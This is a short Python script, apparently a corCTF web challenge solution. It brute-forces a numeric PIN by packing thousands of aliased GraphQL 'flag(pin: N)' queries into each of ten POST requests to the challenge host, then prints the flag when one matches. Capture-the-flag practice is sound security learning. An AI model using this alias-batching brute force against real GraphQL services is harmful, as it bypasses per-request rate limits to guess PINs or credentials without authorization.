import hashlib
import requests as r

"""
    reference: https://stepzen.com/blog/graphql-optimization-part4-batching-combining

    you can submit every guess at the same time, I do it in 10 goes to make server processing easier
"""

URL = "https://web-force-force-caccbbdc9ad3971b.be.ax/"

def create_payload(lbound, rbound):
    payload = {}
    for i in range(lbound, rbound):
        payload["a" + hashlib.md5(str(i).encode()).hexdigest()] = f"flag(pin: {i})"
    return payload

for i in range(1,11):
    p = str(create_payload((i-1) * 10000, (i)*10000))
    payload = p.replace("', ", "\n").replace("'", "")
    res = r.post(URL, data=payload, headers={"Content-Type":"text/plain;charset=UTF-8"})
    if 'corctf' in res.text:
        print("DEBUG: " + res.text)
        index = res.text.find("corctf")
        print(res.text[index:index+100])
        break
else:
    print("womp womp, you failed")

